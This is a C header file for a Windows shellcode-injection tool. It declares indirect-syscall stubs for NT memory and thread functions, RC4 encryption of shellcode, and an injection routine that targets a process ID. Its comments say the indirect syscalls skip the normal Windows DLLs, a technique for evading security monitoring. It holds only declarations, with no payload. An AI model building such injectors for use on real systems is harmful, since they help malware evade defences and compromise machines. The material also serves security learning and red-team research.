#pragma once
#include <Windows.h>
#include <stdio.h>

#define STATUS_SUCCESS (NTSTATUS)0x00000000L
#define OKAY(MSG, ...) printf("[+] "               MSG "\n", ##__VA_ARGS__)
#define INFO(MSG, ...) printf("[*] "               MSG "\n", ##__VA_ARGS__)
#define WARN(MSG, ...) fprintf(stderr, "[-] "      MSG "\n", ##__VA_ARGS__)
#define CHAR(MSG, ...) printf("[>] Press <Enter> to "		MSG "\n", ##__VA_ARGS__)



typedef unsigned __int64 QWORD;

DWORD g_NtOpenProcessSSN;
DWORD g_NtAllocateVirtualMemorySSN;
DWORD g_NtWriteVirtualMemorySSN;
DWORD g_NtProtectVirtualMemorySSN;
DWORD g_NtCreateThreadExSSN;
DWORD g_NtWaitForSingleObjectSSN;
DWORD g_NtFreeVirtualMemorySSN;
DWORD g_NtCloseSSN;

QWORD g_NtOpenProcessSyscall;
QWORD g_NtAllocateVirtualMemorySyscall;
QWORD g_NtWriteVirtualMemorySyscall;
QWORD g_NtProtectVirtualMemorySyscall;
QWORD g_NtCreateThreadExSyscall;
QWORD g_NtWaitForSingleObjectSyscall;
QWORD g_NtFreeVirtualMemorySyscall;
QWORD g_NtCloseSyscall;



/*

    This will be slightly different from direct syscalls
    rather than just calling the function DIRECTLY, we will
    use a jmp instruction to retrive the syscall that we scrapped

    the code between direct and indirect syscalls will be almost identical
    however, in the ASM file we will no longer call syscall, and will
    instead issue a jmp instruction using the following QWORD values

*/


/*

    Don't be alarmed, since we are calling these functions via ASM
    there is no need to directly call them through WINAPI or NTAPI
    so just ignore the red lines, as they will be called indirectly
    skipping all the other Windows DLLs

*/


typedef struct _PS_ATTRIBUTE {
    ULONG  Attribute;
    SIZE_T Size;
    union
    {
        ULONG Value;
        PVOID ValuePtr;
    } u1;
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, * PPS_ATTRIBUTE;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;


typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _PS_ATTRIBUTE_LIST {
    SIZE_T       TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;


extern NTSTATUS NtOpenProcess(
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN PCLIENT_ID ClientId OPTIONAL
);

extern NTSTATUS NtAllocateVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN ULONG ZeroBits,
    IN OUT PSIZE_T RegionSize,
    IN ULONG AllocationType,
    IN ULONG Protect
);

extern NTSTATUS NtWriteVirtualMemory(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN PVOID Buffer,
    IN SIZE_T NumberOfBytesToWrite,
    OUT PSIZE_T NumberOfBytesWritten OPTIONAL
);

extern NTSTATUS NtProtectVirtualMemory(
    _In_      HANDLE ProcessHandle,
    _Inout_   PVOID* BaseAddress,
    _Inout_   PSIZE_T RegionSize,
    _In_      ULONG NewProtect,
    _Out_     PULONG OldProtect
);

extern NTSTATUS NtCreateThreadEx(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN SIZE_T ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL
);

extern NTSTATUS NtWaitForSingleObject(
    _In_ HANDLE Handle,
    _In_ BOOLEAN Alertable,
    _In_opt_ PLARGE_INTEGER Timeout
);

extern NTSTATUS NtFreeVirtualMemory(
    _In_      HANDLE ProcessHandle,
    _Inout_   PVOID* BaseAddress,
    _Inout_   PSIZE_T RegionSize,
    _In_      ULONG FreeType
);

extern NTSTATUS NtClose(
    IN HANDLE Handle
);


typedef NTSTATUS(WINAPI* _SystemFunction033)(
    struct ustring* memoryRegion,
    struct ustring* keyPointer);

struct ustring {
    DWORD Length;
    DWORD MaximumLength;
    PUCHAR Buffer;
} data, key;


BOOL EncryptRC4(
    _In_ CONST PBYTE pShellcode,
    _In_ CONST SIZE_T sSizeofShellcode
);


VOID IndirectPrelude(IN HMODULE mod, IN LPCSTR FuncName, OUT DWORD* FuncSSN, OUT PUINT_PTR FuncSys);



BOOL NtShellInjection(
    _In_ CONST DWORD PID,
    CONST PBYTE pEncryptedShellcode,
    _In_ CONST PBYTE pShellcode,
    _In_ CONST SIZE_T sSizeofShellcode
);